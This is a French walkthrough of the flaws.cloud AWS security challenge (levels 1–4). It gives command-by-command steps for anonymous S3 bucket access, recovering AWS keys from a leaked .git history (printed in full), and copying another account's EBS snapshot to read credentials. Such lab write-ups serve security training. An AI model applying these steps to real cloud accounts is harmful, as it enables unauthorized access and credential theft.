# Flaws.cloud

## Level 1

Nécessité de trouver le premier sous-domaine.

```
dig flaws.cloud
dig 52.92.176.59
dig 52.92.196.187
```

=> s3-website-us-west-2.amazonaws.com     
=> On a bien aussi un http://flaws.cloud.s3-website-us-west-2.amazonaws.com/     

Listing puis lecture en anonyme parce que le bucket a été trop ouvert en permissions : 

```
winget install Amazon.AWSCLI
aws s3 ls  s3://flaws.cloud/ --no-sign-request
aws s3 cp s3://flaws.cloud/secret-dd02c7c.html - --no-sign-request
```
## Level 2

Même principe mais avec un compte gratuit au lieu du mode anonyme : 

```
aws login
aws configure list
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
aws s3 cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html -

# Si besoin de rentrer les clés à la main :
aws configure --profile myprofile
```

## Level 3

Fuite d'une clé dans un dossier .git : 

```
aws ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ --no-sign-request
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request

git log --oneline --all
git log -p
```

Ajout des clés trouvées vers un autre profil puis vérification : 

```
aws configure set aws_access_key_id AKIAJ366LIPB4IJKT7SA --profile flaws-level3

aws configure set aws_secret_access_key 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 --profile flaws-level3

aws --profile flaws-level3 s3 ls
```

## Level 4 

Page web avec formulaire de login en HTTP Basic classique.

La consigne donne l'information qu'un snapshot avait été fait après le premier déploiement.

Récupération de l'ID pour le compte obtenu précédemment : 

	aws --profile flaws-level3 sts get-caller-identity

Résultat : 

```
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

Le compte devrait donc évidemment être lié au snapshot et on peut tenter de les lister avec : 

	aws --profile flaws-level3  ec2 describe-snapshots --owner-id 975426262029 --region us-west-2

Montage du snapshot trouvé sur mon propre compte : 

```
aws --profile default ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89

aws --profile default ec2 describe-volumes --region us-west-2 --volume-id vol-0516bb9bfb0ece8bf --output json
# Le numéro de volume est obtenu à la création
```

Création de la clé SSH :  

```
aws --profile default ec2 create-key-pair --key-name flaws-ec2 --region us-west-2 --query "KeyMaterial" --output text > flaws-ec2.pem

icacls flaws-ec2.pem /inheritance:r
icacls flaws-ec2.pem /grant:r "$($env:USERNAME):(R)"
```

Récupération des informations et attachement du volume : 

```
aws --profile default ec2 describe-images --region us-west-2 --owners 099720109477 --filters "Name=name,Values=ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*" "Name=state,Values=available" --query "reverse(sort_by(Images,&CreationDate))[:1].ImageId" --output text 

# => Retourne l'AMI, ici ami-0e1601cee784a69a2

aws --profile default ec2 run-instances --region us-west-2 --image-id ami-0e1601cee784a69a2 --instance-type t2.micro --key-name flaws-ec2 --placement AvailabilityZone=us-west-2a --output table

# => Noter l'InstanceId, ici i-0350e33a15c961474

aws --profile default ec2 attach-volume --region us-west-2 --volume-id vol-0516bb9bfb0ece8bf --instance-id i-0350e33a15c961474 --device /dev/sdf

```

Ouverture d'une règle pour autoriser le port 22 : 

```
(Invoke-WebRequest -Uri "https://checkip.amazonaws.com").Content.Trim()
# => Noter l'IP
aws --profile default ec2 describe-instances --region us-west-2 --query "Reservations[].Instances[].SecurityGroups[0].GroupId" --output text
# => Noter le numéro du SG

aws --profile default ec2 authorize-security-group-ingress --region us-west-2 --group-id sg-03958cbe31ee98d3d --protocol tcp --port 22 --cidr 77.236.9.255/32

```

Récupération de l'IP publique et connexion SSH : 

```
aws --profile default ec2 describe-instances --region us-west-2 --query "Reservations[].Instances[].PublicIpAddress" --output text

ssh -i flaws-ec2.pem ubuntu@44.251.179.54
```

On trouve ensuite tout bêtement les credentials dans le fichier /home/ubuntu/setupNginx.sh

## Level 5 

TO DO
